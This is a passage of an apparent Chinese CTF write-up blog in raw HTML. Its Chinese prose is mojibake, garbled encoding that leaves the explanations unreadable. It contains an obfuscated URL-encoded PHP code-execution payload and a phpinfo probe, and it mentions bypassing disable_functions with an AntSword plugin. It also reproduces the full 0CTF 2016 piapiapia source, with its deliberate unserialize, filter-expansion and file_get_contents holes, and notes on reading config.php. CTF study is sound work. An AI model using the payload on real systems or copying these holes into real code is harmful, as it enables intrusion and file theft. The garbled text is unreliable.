class="hljs-comment">//https://www.cnblogs.com/Article-kelp/p/14704975.html</span><br>    <br></code></pre></td></tr></table></figure><p><code>?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%CE%A2%D6%C4);</code></p><p><code>POST</code>ä¼ <code>1=phpinfo();</code>(<code>PHP Version 7.0.33</code>)ï¼Œåœ¨<code>disable_functions</code>ä¸­å‘ç°ç¦ç”¨äº†å¤§é‡å‡½æ•°ï¼š</p><p><img src="/img/qvfan1.png" alt="qvfan1"></p><p>åé¢æœ‰ä¸¤ç§è§£æ³•ï¼š</p><p>1.å°±æ˜¯åˆ©ç”¨èšå‰‘ä¸­è¿™ä¸ªæ’ä»¶(æ³¨æ„è¦åœ¨<code>Linux</code>ä¸‹ä½¿ç”¨ï¼Œå®‰è£…å¯ä»¥å‚è€ƒ<code>[Bypass - èšå‰‘èœåˆ€è™šæ‹Ÿç»ˆç«¯æ‰§è¡Œå‘½ä»¤è¿”å›ret=127 | CN-SEC ä¸­æ–‡ç½‘](https://cn-sec.com/archives/1878964.html)</code>)ï¼š</p><p><img src="/img/rceme6.png" alt="rceme6"></p><p><img src="/img/rceme7.png" alt="rceme7"></p><p><img src="/img/rceme5.png" alt="rceme5"></p><p><code>flag&#123;3a24f812-7171-4308-a702-d7a77fd2c2cd&#125;</code></p><p><strong>evalå‡½æ•°ä¸­å‚æ•°æ˜¯å­—ç¬¦</strong>ï¼Œ<strong>assertå‡½æ•°ä¸­å‚æ•°ä¸ºè¡¨è¾¾å¼ ï¼ˆæˆ–è€…ä¸ºå‡½æ•°</strong></p><p><code>https://www.cnblogs.com/NoCirc1e/p/16275602.html</code></p><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>æ˜¯ä¸ªç™»å½•ç•Œé¢ï¼Œä¸€å¼€å§‹ä»¥ä¸ºsqlæ³¨å…¥ï¼Œä½†å°è¯•åå‘ç°ä¸å­˜åœ¨æ³¨å…¥ç‚¹ã€‚</p><p><code>www.zip</code>æ³„éœ²(è¿˜æŒºå¤šçš„)ï¼š</p><p><img src="/img/pia1.png" alt="pia1"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &#123; <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: profile.php&#x27;</span>);<br><span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$username</span>) &lt; <span class="hljs-number">3</span> <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$username</span>) &gt; <span class="hljs-number">16</span>) <span class="hljs-comment">//é™åˆ¶äº†ç”¨æˆ·åå’Œå¯†ç çš„é•¿åº¦</span><br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid user name&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$password</span>) &lt; <span class="hljs-number">3</span> <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$password</span>) &gt; <span class="hljs-number">16</span>) <br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid password&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>)) &#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$username</span>;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: profile.php&#x27;</span>);<br><span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid user name or password&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//class.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">mysql</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;users&#x27;</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_exists</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">select</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$password</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$key_list</span> = <span class="hljs-title function_ invoke__">Array</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>);<br><span class="hljs-variable">$value_list</span> = <span class="hljs-title function_ invoke__">Array</span>(<span class="hljs-variable">$username</span>, <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>));<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">insert</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-variable">$key_list</span>, <span class="hljs-variable">$value_list</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$password</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$object</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">select</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$object</span> &amp;&amp; <span class="hljs-variable">$object</span>-&gt;password === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>)) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$object</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">select</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$object</span>-&gt;profile;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$new_profile</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$new_profile</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$new_profile</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-variable">$new_profile</span>, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">return</span> __class__;<br>&#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mysql</span> </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$link</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"><span class="hljs-variable">$config</span></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;link = <span class="hljs-title function_ invoke__">mysql_connect</span>(<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;hostname&#x27;</span>],<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;password&#x27;</span>]<br>);<br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;database&#x27;</span>]);<br><span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;link;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">select</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$where</span>, <span class="hljs-variable">$ret</span> = <span class="hljs-string">&#x27;*&#x27;</span></span>) </span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT <span class="hljs-subst">$ret</span> FROM <span class="hljs-subst">$table</span> WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>, <span class="hljs-variable">$this</span>-&gt;link);<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mysql_fetch_object</span>(<span class="hljs-variable">$result</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$key_list</span>, <span class="hljs-variable">$value_list</span></span>) </span>&#123;<br><span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$key_list</span>);<br><span class="hljs-variable">$value</span> = <span class="hljs-string">&#x27;\&#x27;&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;\&#x27;,\&#x27;&#x27;</span>, <span class="hljs-variable">$value_list</span>) . <span class="hljs-string">&#x27;\&#x27;&#x27;</span>; <br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO <span class="hljs-subst">$table</span> (<span class="hljs-subst">$key</span>) VALUES (<span class="hljs-subst">$value</span>)&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$where</span></span>) </span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE <span class="hljs-subst">$table</span> SET <span class="hljs-subst">$key</span> = &#x27;<span class="hljs-subst">$value</span>&#x27; WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br><span class="hljs-variable">$escape</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);<br><span class="hljs-variable">$escape</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$escape</span>) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$escape</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$string</span>);<br><br><span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br><span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">return</span> __class__;<br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>();<br><span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">connect</span>(<span class="hljs-variable">$config</span>);<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">register</span>.phpå°±æ˜¯ç®€å•çš„æ³¨å†ŒåŠŸèƒ½<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//config.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;hostname&#x27;</span>] = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;database&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;&#x27;</span>; <span class="hljs-comment">//!</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//profile.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$profile</span>=<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">show_profile</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$profile</span>  == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: update.php&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$profile</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$profile</span>);<span class="hljs-comment">//æ³¨æ„è¿™é‡Œçš„ååºåˆ—åŒ–</span><br><span class="hljs-variable">$phone</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br><span class="hljs-variable">$email</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br><span class="hljs-variable">$nickname</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br><span class="hljs-variable">$photo</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]));<span class="hljs-comment">//æ³¨æ„è¿™é‡Œçš„file_get_contentså‡½æ•°ï¼Œå¯ä»¥åˆ©ç”¨å…¶è¯»å–config.php</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//update.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]) &#123;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid phone&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid email&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) &gt; <span class="hljs-number">10</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid nickname&#x27;</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &lt; <span class="hljs-number">5</span> <span class="hljs-keyword">or</span> <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">1000000</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Photo size error&#x27;</span>);<br><br><span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;upload/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]));<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;upload/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><br><span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">update_profile</span>(<span class="hljs-variable">$username</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$profile</span>));<span class="hljs-comment">//userå¯¹è±¡è®¿é—®update_profileæ–¹æ³•ï¼Œå­˜åœ¨åºåˆ—åŒ–</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><code>flag</code>åœ¨<code>config.php</code>ä¸­ï¼Œè¦æƒ³åŠæ³•è¯»è¿™ä¸ªæ–‡ä»¶ã€‚<code>$photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code>ä½¿æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„ç‚¹ï¼Œæƒ³åŠæ³•è®©<code>profile</code>æ•°ç»„ä¸­<code>photo</code>é”®å¯¹åº”çš„å€¼æ˜¯<code>config.php</code>å°±è¡Œã€‚</p><figure 